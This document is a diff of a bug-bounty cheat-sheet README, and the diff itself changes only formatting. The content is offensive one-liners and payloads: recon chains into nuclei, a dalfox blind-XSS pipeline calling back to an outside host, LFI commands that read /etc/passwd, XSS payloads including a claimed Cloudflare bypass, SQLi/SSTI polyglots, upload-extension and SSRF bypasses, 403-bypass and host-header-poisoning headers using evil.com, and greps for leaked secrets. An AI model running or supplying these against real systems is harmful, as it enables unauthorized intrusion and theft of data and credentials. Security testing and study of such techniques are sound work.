@@ -1,5 +1,6 @@
-# Automation Command
 # Bug Bounty TIPS and Usage of tools + One Liner TIPS :
+
+## Automation Command :
 
 ```bash
 amass intel -cidr 127.0.0.1/21 | subfinder -silent -all -o subdo.txt | rustscan -a subdo.txt -r 1-65535 | grep Open | tee open_ports.txt | sed 's/Open //' | httpx -silent | nuclei -t ~/nuclei-templates
@@ -40,6 +41,7 @@ httpx -l url.txt -path "///////../../../../../../etc/passwd" -status-code -mc 20
  ```bash
 xargs -a cidr.txt -I@ bash -c 'amass intel -active -cidr @' | subfinder -all -silent | gauplus -subs | gf xss | uro | dalfox pipe --deep-domxss --multicast --blind dotdot.xss.ht
  ```
+---
 
 ### ONE-LINER *RECON* for FUZZ XSS :
 
@@ -59,7 +61,6 @@ $ amass enum -brute -passive -d http://example.com | sed 's#*.# #g' | httpx -sil
 
 ---
 
-
 ### COMMAND Injection with *FUFF* ONE-LINER :
 
 ```sh
@@ -69,9 +70,7 @@ $ ffuf -ac -u FUZZ -w fuzzing.txt -replay-proxy 127.0.0.1:8080
 // You can use the same query for search SSTI in qsreplase add "{{7*7}}" and search on burp for '49'
 ```
 
-
 ---
-
 
 ### SQL Injection Tips :
 
@@ -91,16 +90,13 @@ $ sqlmap -u "http://redacted.com" --dbs --batch --random-agent --forms --ignore-
 
 ---
 
-
 ### XSS + SQLi + CSTI/SSTI
 
 ```sh
 Payload: '"><svg/onload=prompt(5);>{{7*7}}
 ```
 
-
 ---
-
 
 ### EXIFTOOL + file UPLOAD Tips :
 
@@ -127,9 +123,7 @@ file.png.jpg.php
 file.php%00.png%00.jpg
 ```
 
-
 ---
-
 
 ### Open Redirect Tips ONE-LINER :
 
@@ -137,9 +131,7 @@ file.php%00.png%00.jpg
 $ export LHOST="http://localhost"; gau $1 | gf redirect | qsreplace "$LHOST" | xargs -I % -P 25 sh -c 'curl -Is "%" 2>&1 | grep -q "Location: $LHOST" && echo "VULN! %"'
 ```
 
-
 ---
-
 
 ### LFI ONE-LINER :
 
@@ -147,9 +139,7 @@ $ export LHOST="http://localhost"; gau $1 | gf redirect | qsreplace "$LHOST" | x
 $ gauplus -random-agent -t 200 http://redacted.com | gf lfi | qsreplace "/etc/passwd" | xargs -I% -P 25 sh -c 'curl -s "%" 2>&1 | grep -q "root:x" && echo "VULN! %"'
 ```
 
-
 ---
-
 
 ### Best SSRF Bypass :
 
@@ -164,9 +154,7 @@ http://017700000001
 http://0177.00.00.01
 ```
 
-
 ---
-
 
 ### Email Attacks :
 
@@ -189,7 +177,6 @@ john.doe@abc123.burpcollaborator.net
 john.doe@[127.0.0.1]
 ```
 
-
 ---
 
 
@@ -202,16 +189,13 @@ john.doe@[127.0.0.1]
 <<script>alert('xss')<!--a-->a.png
 ```
 
-
 ---
-
 
 ### My XSS for bypass CLOUDFLARE with default rules
 
 ```sh
 "/><svg+svg+svg\/\/On+OnLoAd=confirm(1)>
 ```
-
 
 ---
 
@@ -221,7 +205,6 @@ john.doe@[127.0.0.1]
 ```sh
 $ amass enum -passive -brute -d redacted.com | gau | egrep -v '(.css|.svg)' | while read url; do vars=$(curl -s $url | grep -Eo "var [a-zA-Z0-9]+" | sed -e 's,'var','"$url"?',g' -e 's/ //g' | grep -v '.js' | sed 's/.*/&=xss/g'); echo -e "\e[1;33m$url\n\e[1;32m$vars"; done
 ```
-
 
 ---
 
@@ -237,7 +220,6 @@ $ amass enum -passive -brute -d redacted.com | gau | egrep -v '(.css|.svg)' | wh
 ~Reload page
 ```
 
-
 ---
 
 
@@ -247,6 +229,7 @@ $ amass enum -passive -brute -d redacted.com | gau | egrep -v '(.css|.svg)' | wh
 $ use gauplus and paramspider , after you can grep words like "api" or "key" and use gmapsapiscanner for see if is vulnerable.
 ```
 
+---
 
 ### Find sensitive information with GF tool :
 
@@ -255,7 +238,6 @@ $ gauplus redacted.com -subs | cut -d"?" -f1 | grep -E "\.js+(?:on|)$" | tee dom
 sort -u domains.txt | fff -s 200 -o out/
 $ for i in `gf -list`; do [[ ${i} =~ "_secrets"* ]] && gf ${i}; done
 ```
-
 
 ---
 
@@ -272,7 +254,6 @@ X-Host: IP
 X-Forwared-Host: IP
 ```
 
-
 ---
 
 
@@ -286,7 +267,6 @@ $ ffuf -mc 200 w jsurls.txt:HFUZZ -u HFUZZ -replay-proxy http://127.0.0.1:8080
 // Extract found tokens and validate with https://github.com/streaak/keyhacks
 ```
 
-
 ---
 
 
@@ -295,7 +275,6 @@ $ ffuf -mc 200 w jsurls.txt:HFUZZ -u HFUZZ -replay-proxy http://127.0.0.1:8080
 ```sh
 $ amass enum -d redacted.com | httpx -threads 300 -follow-redirects -silent | rush -j200 'curl -m5 -s -I -H "Origin: evil.com" {} | [[ $(grep -c "evil.com") -gt 0 ]] && printf "\n3[0;32m[VUL TO CORS] 3[0m{}"' 2>/dev/null
 ```
-
 
 ---
 
@@ -307,7 +286,6 @@ X-Original-URL: /admin
 X-Override-URL: /admin
 X-Rewrite-URL: /admin
 ```
-
 
 ---
 
@@ -322,9 +300,7 @@ Host: evil.com
 // If you receive a link this works!
 ```
 
-
 ---
-
 
 ### Best Wordlists :
 
@@ -333,11 +309,4 @@ https://github.com/six2dez/OneListForAll/releases
 https://github.com/Karanxa/Bug-Bounty-Wordlists
 ```
 
-
 ---
-
-## Thanks 
-
-Don't forget to follow me on Twitter.
-
-[@0xJin](https://twitter.com/0xJin) - This tool is made with ❤️ by 0xJin ¯\\_(ツ)_/¯.
